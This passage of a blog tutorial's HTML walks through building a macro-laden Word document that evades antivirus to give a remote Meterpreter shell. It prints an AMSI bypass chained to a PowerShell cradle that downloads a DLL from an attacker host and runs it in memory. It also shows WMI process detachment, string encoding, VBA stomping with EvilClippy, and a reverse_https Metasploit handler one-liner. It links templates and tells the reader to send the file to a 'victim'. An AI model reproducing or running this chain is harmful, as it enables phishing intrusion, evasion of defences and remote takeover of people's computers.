https://miro.medium.com/v2/resize:fit:750/1*_hhkxwBFJnvNgb-1oGf2Sw.png 750w, https://miro.medium.com/v2/resize:fit:786/1*_hhkxwBFJnvNgb-1oGf2Sw.png 786w, https://miro.medium.com/v2/resize:fit:828/1*_hhkxwBFJnvNgb-1oGf2Sw.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*_hhkxwBFJnvNgb-1oGf2Sw.png 1100w, https://miro.medium.com/v2/resize:fit:1062/1*_hhkxwBFJnvNgb-1oGf2Sw.png 1062w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 531px"><img alt="" class="be lt nx c" width="531" height="282" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:664/1*_hhkxwBFJnvNgb-1oGf2Sw.png"></picture></div><figcaption class="wt fc tx nk nl wu wv bc b bd z dr" data-selectable-paragraph="">Remember to use Release + proper architecture(x64) during all compilations.</figcaption></figure><ul class=""><li id="38b3" class="mm mn ha mo b mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj vt vu vv bh" data-selectable-paragraph="">Then download the <code class="cu wp wq wr wf b"><a class="af te" href="https://github.com/Karmaz95/evasion/blob/main/holcrimson.sln" rel="noopener ugc nofollow" target="_blank">holcrimson.sln</a></code> template from my GitHub, replace the shellcode at line 92, compile it as x64 DLL and start the HTTP webserver.</li></ul><figure class="nn no np nq nr ns nk nl paragraph-image"><div role="button" tabindex="0" class="nt nu fg nv be nw"><div class="nk nl xi"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*5iuUaW6LBZdhFk8pkWQK8Q.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*5iuUaW6LBZdhFk8pkWQK8Q.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*5iuUaW6LBZdhFk8pkWQK8Q.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*5iuUaW6LBZdhFk8pkWQK8Q.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*5iuUaW6LBZdhFk8pkWQK8Q.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*5iuUaW6LBZdhFk8pkWQK8Q.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*5iuUaW6LBZdhFk8pkWQK8Q.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*5iuUaW6LBZdhFk8pkWQK8Q.png 640w, https://miro.medium.com/v2/resize:fit:720/1*5iuUaW6LBZdhFk8pkWQK8Q.png 720w, https://miro.medium.com/v2/resize:fit:750/1*5iuUaW6LBZdhFk8pkWQK8Q.png 750w, https://miro.medium.com/v2/resize:fit:786/1*5iuUaW6LBZdhFk8pkWQK8Q.png 786w, https://miro.medium.com/v2/resize:fit:828/1*5iuUaW6LBZdhFk8pkWQK8Q.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*5iuUaW6LBZdhFk8pkWQK8Q.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*5iuUaW6LBZdhFk8pkWQK8Q.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="be lt nx c" width="700" height="85" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:875/1*5iuUaW6LBZdhFk8pkWQK8Q.png"></picture></div></div></figure><h2 id="7ac7" class="ve nz ha bc oa vf vg dv oe vh vi dx oi mx vj vk vl nb vm vn vo nf vp vq vr vs bh" data-selectable-paragraph="">AMSI</h2><p id="edd0" class="pw-post-body-paragraph mm mn ha mo b mp ow mr ms mt ox mv mw mx oy mz na nb oz nd ne nf pa nh ni nj gt bh" data-selectable-paragraph="">When a PowerShell process is created, AMSI.DLL is loaded from the disk into its address space. In the PowerShell command prompt, <strong class="mo hb">any supplied content would be</strong> <strong class="mo hb">first</strong> <strong class="mo hb">scanned by the Microsoft Defender before the execution</strong>.</p><p id="a73f" class="pw-post-body-paragraph mm mn ha mo b mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj gt bh" data-selectable-paragraph="">Fortunately, there are plenty easy to implement bypasses that are up to date. You can try to use “CaMeL cAsE” strings, or strings concatenations, but for me, the best option for sure is the <strong class="mo hb">amsiInitFailed</strong> which still works (18.03.2022):</p><figure class="nn no np nq nr ns nk nl paragraph-image"><div role="button" tabindex="0" class="nt nu fg nv be nw"><div class="nk nl xj"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*f-DCO9vI6oj-lFRQ4Y4vYA.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*f-DCO9vI6oj-lFRQ4Y4vYA.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*f-DCO9vI6oj-lFRQ4Y4vYA.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*f-DCO9vI6oj-lFRQ4Y4vYA.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*f-DCO9vI6oj-lFRQ4Y4vYA.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*f-DCO9vI6oj-lFRQ4Y4vYA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*f-DCO9vI6oj-lFRQ4Y4vYA.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*f-DCO9vI6oj-lFRQ4Y4vYA.png 640w, https://miro.medium.com/v2/resize:fit:720/1*f-DCO9vI6oj-lFRQ4Y4vYA.png 720w, https://miro.medium.com/v2/resize:fit:750/1*f-DCO9vI6oj-lFRQ4Y4vYA.png 750w, https://miro.medium.com/v2/resize:fit:786/1*f-DCO9vI6oj-lFRQ4Y4vYA.png 786w, https://miro.medium.com/v2/resize:fit:828/1*f-DCO9vI6oj-lFRQ4Y4vYA.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*f-DCO9vI6oj-lFRQ4Y4vYA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*f-DCO9vI6oj-lFRQ4Y4vYA.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="be lt nx c" width="700" height="383" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:875/1*f-DCO9vI6oj-lFRQ4Y4vYA.png"></picture></div></div></figure><h2 id="7088" class="ve nz ha bc oa vf vg dv oe vh vi dx oi mx vj vk vl nb vm vn vo nf vp vq vr vs bh" data-selectable-paragraph="">RUNNING IN THE MEMORY</h2><p id="cd68" class="pw-post-body-paragraph mm mn ha mo b mp ow mr ms mt ox mv mw mx oy mz na nb oz nd ne nf pa nh ni nj gt bh" data-selectable-paragraph="">Downloading and <strong class="mo hb">keeping the malware on the disk is not a good idea</strong>, because it can be easier to detect by the anti-virus. You can download and <strong class="mo hb">execute the unmanaged DLL straight in the memory using PowerShell</strong>.</p><ul class=""><li id="5b23" class="mm mn ha mo b mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj vt vu vv bh" data-selectable-paragraph=""><code class="cu wp wq wr wf b"><a class="af te" href="https://github.com/Karmaz95/evasion/blob/main/platform.txt" rel="noopener ugc nofollow" target="_blank">platform.txt</a></code> — PowerShell script which disables AMSI, then download <code class="cu wp wq wr wf b">holcrimson.dll</code> ShellCode Runner, and execute it in the memory.</li></ul><pre class="nn no np nq nr we wf wg wh av ql bh"><span id="aa77" class="ve nz ha wf b iq wi wj l wk wl" data-selectable-paragraph="">$a = [Ref].Assembly.GetTypes()<br>ForEach($b in $a) {if ($b.Name -like "*iUtils") {$c = $b}}<br>$d = $c.GetFields('NonPublic,Static')<br>ForEach($e in $d) {if ($e.Name -like "*Failed") {$f = $e}}<br>$f.SetValue($null,$true)<br>$data = (New-Object System.Net.WebClient).DownloadData("<a class="af te" href="http://192.168.88.175/holcrimson.dll'" rel="noopener ugc nofollow" target="_blank">http://192.168.88.175/holcrimson.dll</a>")<br>$assem = [System.Reflection.Assembly]::Load($data)<br>$class = $assem.GetType("holcrimson.Program")<br>$method = $class.GetMethod("Run")<br>$method.Invoke(0, $null)</span></pre><h2 id="f935" class="ve nz ha bc oa vf vg dv oe vh vi dx oi mx vj vk vl nb vm vn vo nf vp vq vr vs bh" data-selectable-paragraph="">DETACHED WMI — VBA</h2><p id="28ce" class="pw-post-body-paragraph mm mn ha mo b mp ow mr ms mt ox mv mw mx oy mz na nb oz nd ne nf pa nh ni nj gt bh" data-selectable-paragraph="">Windows Management Instrumentation (WMI) framework could be used to <strong class="mo hb">detach the PowerShell Cradle child process from the Word Office </strong>— which could be flagged as malicious by anti-virus. You can use WMI from VBA to <strong class="mo hb">create a standalone PowerShell process</strong> that is much less suspicious.</p><pre class="nn no np nq nr we wf wg wh av ql bh"><span id="2934" class="ve nz ha wf b iq wi wj l wk wl" data-selectable-paragraph="">GetObject("winmgmts:").Get("Win32_Process").Create strArg, Null, Null, pid</span></pre><h2 id="6910" class="ve nz ha bc oa vf vg dv oe vh vi dx oi mx vj vk vl nb vm vn vo nf vp vq vr vs bh" data-selectable-paragraph="">CUSTOM ENCODING &amp; FUNCTIONS NAMING — VBA</h2><p id="3b97" class="pw-post-body-paragraph mm mn ha mo b mp ow mr ms mt ox mv mw mx oy mz na nb oz nd ne nf pa nh ni nj gt bh" data-selectable-paragraph="">You should<strong class="mo hb"> encode the PS Cradle </strong>and other strings used within your VBA macro. This includes the above-mentioned detached WMI and the Word Macro document name.</p><ul class=""><li id="3db3" class="mm mn ha mo b mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj vt vu vv bh" data-selectable-paragraph="">Use <code class="cu wp wq wr wf b"><a class="af te" href="https://github.com/Karmaz95/evasion/blob/main/VBA_XORencrypt.ps1" rel="noopener ugc nofollow" target="_blank">VBA_XORencrypt.ps1</a></code> place string to encode in payload variables inside the script and execute it.</li></ul><pre class="nn no np nq nr we wf wg wh av ql bh"><span id="e929" class="ve nz ha wf b iq wi wj l wk wl" data-selectable-paragraph="">PS Cradle     =&gt; line 1<br>winmgmts:     =&gt; line 22<br>Win32_Process =&gt; line 42 <br>Doc name      =&gt; line 63</span></pre><figure class="nn no np nq nr ns nk nl paragraph-image"><div class="nk nl xk"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*X-sRAtPcmMH9zTXf_6r-Fg.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*X-sRAtPcmMH9zTXf_6r-Fg.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*X-sRAtPcmMH9zTXf_6r-Fg.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*X-sRAtPcmMH9zTXf_6r-Fg.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*X-sRAtPcmMH9zTXf_6r-Fg.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*X-sRAtPcmMH9zTXf_6r-Fg.png 1100w, https://miro.medium.com/v2/resize:fit:1010/format:webp/1*X-sRAtPcmMH9zTXf_6r-Fg.png 1010w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 505px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*X-sRAtPcmMH9zTXf_6r-Fg.png 640w, https://miro.medium.com/v2/resize:fit:720/1*X-sRAtPcmMH9zTXf_6r-Fg.png 720w, https://miro.medium.com/v2/resize:fit:750/1*X-sRAtPcmMH9zTXf_6r-Fg.png 750w, https://miro.medium.com/v2/resize:fit:786/1*X-sRAtPcmMH9zTXf_6r-Fg.png 786w, https://miro.medium.com/v2/resize:fit:828/1*X-sRAtPcmMH9zTXf_6r-Fg.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*X-sRAtPcmMH9zTXf_6r-Fg.png 1100w, https://miro.medium.com/v2/resize:fit:1010/1*X-sRAtPcmMH9zTXf_6r-Fg.png 1010w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 505px"><img alt="" class="be lt nx c" width="505" height="185" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:631/1*X-sRAtPcmMH9zTXf_6r-Fg.png"></picture></div></figure><ul class=""><li id="8d36" class="mm mn ha mo b mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj vt vu vv bh" data-selectable-paragraph="">Then use <code class="cu wp wq wr wf b"><a class="af te" href="https://github.com/Karmaz95/evasion/blob/main/macro.vba" rel="noopener ugc nofollow" target="_blank">macro.vba</a></code> and swap placeholders with (1) encoded PS Cradle (2) <code class="cu wp wq wr wf b">winmgmts:</code> (3) <code class="cu wp wq wr wf b">Win32_Process</code> and <code class="cu wp wq wr wf b">Doc1.doc</code> .</li></ul><figure class="nn no np nq nr ns nk nl paragraph-image"><div role="button" tabindex="0" class="nt nu fg nv be nw"><div class="nk nl xl"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*8lWIpCO48_qUQJL-0DiSiQ.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*8lWIpCO48_qUQJL-0DiSiQ.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*8lWIpCO48_qUQJL-0DiSiQ.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*8lWIpCO48_qUQJL-0DiSiQ.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*8lWIpCO48_qUQJL-0DiSiQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*8lWIpCO48_qUQJL-0DiSiQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*8lWIpCO48_qUQJL-0DiSiQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*8lWIpCO48_qUQJL-0DiSiQ.png 640w, https://miro.medium.com/v2/resize:fit:720/1*8lWIpCO48_qUQJL-0DiSiQ.png 720w, https://miro.medium.com/v2/resize:fit:750/1*8lWIpCO48_qUQJL-0DiSiQ.png 750w, https://miro.medium.com/v2/resize:fit:786/1*8lWIpCO48_qUQJL-0DiSiQ.png 786w, https://miro.medium.com/v2/resize:fit:828/1*8lWIpCO48_qUQJL-0DiSiQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*8lWIpCO48_qUQJL-0DiSiQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*8lWIpCO48_qUQJL-0DiSiQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="be lt nx c" width="700" height="146" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:875/1*8lWIpCO48_qUQJL-0DiSiQ.png"></picture></div></div></figure><ul class=""><li id="e408" class="mm mn ha mo b mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj vt vu vv bh" data-selectable-paragraph="">You should change the functions and variables names as well to something else from “Apples”, “Water” and so on because it could be flagged as well.</li><li id="e57b" class="mm mn ha mo b mp vy mr ms mt vz mv mw mx wa mz na nb wb nd ne nf wc nh ni nj vt vu vv bh" data-selectable-paragraph="">Make sure you chose the same (3) name of the macro <code class="cu wp wq wr wf b">MyMacro</code> and set it for (4) current document.</li></ul><figure class="nn no np nq nr ns nk nl paragraph-image"><div role="button" tabindex="0" class="nt nu fg nv be nw"><div class="nk nl xm"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*NtnfoI1SOXQnFQFr8WOAGQ.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*NtnfoI1SOXQnFQFr8WOAGQ.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*NtnfoI1SOXQnFQFr8WOAGQ.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*NtnfoI1SOXQnFQFr8WOAGQ.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*NtnfoI1SOXQnFQFr8WOAGQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*NtnfoI1SOXQnFQFr8WOAGQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*NtnfoI1SOXQnFQFr8WOAGQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*NtnfoI1SOXQnFQFr8WOAGQ.png 640w, https://miro.medium.com/v2/resize:fit:720/1*NtnfoI1SOXQnFQFr8WOAGQ.png 720w, https://miro.medium.com/v2/resize:fit:750/1*NtnfoI1SOXQnFQFr8WOAGQ.png 750w, https://miro.medium.com/v2/resize:fit:786/1*NtnfoI1SOXQnFQFr8WOAGQ.png 786w, https://miro.medium.com/v2/resize:fit:828/1*NtnfoI1SOXQnFQFr8WOAGQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*NtnfoI1SOXQnFQFr8WOAGQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*NtnfoI1SOXQnFQFr8WOAGQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="be lt nx c" width="700" height="473" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:875/1*NtnfoI1SOXQnFQFr8WOAGQ.png"></picture></div></div></figure><ul class=""><li id="5b24" class="mm mn ha mo b mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj vt vu vv bh" data-selectable-paragraph="">Choose <code class="cu wp wq wr wf b">.doc</code> <strong class="mo hb">Word 97–2003 Document</strong> file format.</li></ul><figure class="nn no np nq nr ns nk nl paragraph-image"><div role="button" tabindex="0" class="nt nu fg nv be nw"><div class="nk nl xn"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*M3z6dfGQ_SzzPzM1QP9lcA.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*M3z6dfGQ_SzzPzM1QP9lcA.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*M3z6dfGQ_SzzPzM1QP9lcA.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*M3z6dfGQ_SzzPzM1QP9lcA.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*M3z6dfGQ_SzzPzM1QP9lcA.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*M3z6dfGQ_SzzPzM1QP9lcA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*M3z6dfGQ_SzzPzM1QP9lcA.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*M3z6dfGQ_SzzPzM1QP9lcA.png 640w, https://miro.medium.com/v2/resize:fit:720/1*M3z6dfGQ_SzzPzM1QP9lcA.png 720w, https://miro.medium.com/v2/resize:fit:750/1*M3z6dfGQ_SzzPzM1QP9lcA.png 750w, https://miro.medium.com/v2/resize:fit:786/1*M3z6dfGQ_SzzPzM1QP9lcA.png 786w, https://miro.medium.com/v2/resize:fit:828/1*M3z6dfGQ_SzzPzM1QP9lcA.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*M3z6dfGQ_SzzPzM1QP9lcA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*M3z6dfGQ_SzzPzM1QP9lcA.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="be lt nx c" width="700" height="137" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:875/1*M3z6dfGQ_SzzPzM1QP9lcA.png"></picture></div></div></figure><h2 id="3142" class="ve nz ha bc oa vf vg dv oe vh vi dx oi mx vj vk vl nb vm vn vo nf vp vq vr vs bh" data-selectable-paragraph="">VBA STOMPING</h2><p id="7979" class="pw-post-body-paragraph mm mn ha mo b mp ow mr ms mt ox mv mw mx oy mz na nb oz nd ne nf pa nh ni nj gt bh" data-selectable-paragraph=""><strong class="mo hb">This only works for the same Microsoft Office version</strong>. You can execute the P-CODE cached within the document — without the VBA macro in the macro tab. This trick significantly reduces detectability, but you need to know the version of Office used by the victim.</p><ul class=""><li id="cc2d" class="mm mn ha mo b mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj vt vu vv bh" data-selectable-paragraph="">There is a tool call <code class="cu wp wq wr wf b"><a class="af te" href="https://github.com/outflanknl/EvilClippy" rel="noopener ugc nofollow" target="_blank"><strong class="mo hb">EvilClippy</strong></a></code> to automatically purge VBA macro or can even replace the macro with non-malicious <strong class="mo hb">fake VBA</strong>:</li></ul><pre class="nn no np nq nr we wf wg wh av ql bh"><span id="1bc5" class="ve nz ha wf b iq wi wj l wk wl" data-selectable-paragraph="">.\EvilClippy.exe -s 'C:\Users\karmaz95\Desktop\EvilClippy\fake.vba' -d -r -g "C:\Users\karmaz95\Desktop\EvilClippy\Doc1.doc"</span></pre><ul class=""><li id="a03a" class="mm mn ha mo b mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj vt vu vv bh" data-selectable-paragraph="">You will get as an output <code class="cu wp wq wr wf b">Doc1_EvilClippy.doc</code> — remember to change its name to <code class="cu wp wq wr wf b"><a class="af te" href="https://github.com/Karmaz95/evasion/blob/main/Doc1.doc" rel="noopener ugc nofollow" target="_blank">Doc1.doc</a></code> before sending it to the victim.</li><li id="b968" class="mm mn ha mo b mp vy mr ms mt vz mv mw mx wa mz na nb wb nd ne nf wc nh ni nj vt vu vv bh" data-selectable-paragraph=""><a class="af te" href="https://github.com/Karmaz95/evasion/blob/main/Doc1.doc" rel="noopener ugc nofollow" target="_blank">Link</a> to download the completed <code class="cu wp wq wr wf b"><a class="af te" href="https://github.com/Karmaz95/evasion/blob/main/Doc1.doc" rel="noopener ugc nofollow" target="_blank">Doc1.doc</a></code> example used in this article.</li></ul><h1 id="b4c4" class="ny nz ha bc oa ob oc od oe of og oh oi oj ok ol om on oo op oq or os ot ou ov bh" data-selectable-paragraph="">ATTACK</h1><p id="abe7" class="pw-post-body-paragraph mm mn ha mo b mp ow mr ms mt ox mv mw mx oy mz na nb oz nd ne nf pa nh ni nj gt bh" data-selectable-paragraph="">Now start the listener and send the Word Document to the victim.</p><ul class=""><li id="7397" class="mm mn ha mo b mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj vt vu vv bh" data-selectable-paragraph="">Use listener from the <strong class="mo hb">SCENARIO I</strong> with the previously generated SSL certificate. Below you can see how to do this in one line.</li></ul><pre class="nn no np nq nr we wf wg wh av ql bh"><span id="8679" class="ve nz ha wf b iq wi wj l wk wl" data-selectable-paragraph="">sudo msfconsole -x "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_https;set LHOST 172.29.130.103;set LPORT 443; set exitfunc thread;set SSL true; set HandlerSSLCert /home/karmaz95/temp/custom.pem; set AutoLoadStdapi false; set AutoVerifySession false; set EnableStageEncoding True; set StagerEncoder x64/xor_dynamic;run;"</span></pre><figure class="nn no np nq nr ns nk nl paragraph-image"><div role="button" tabindex="0" class="nt nu fg nv be nw"><div class="nk nl xo"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*k7dLTxN8VWBisouw2GRJRg.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*k7dLTxN8VWBisouw2GRJRg.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*k7dLTxN8VWBisouw2GRJRg.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*k7dLTxN8VWBisouw2GRJRg.png 786w, 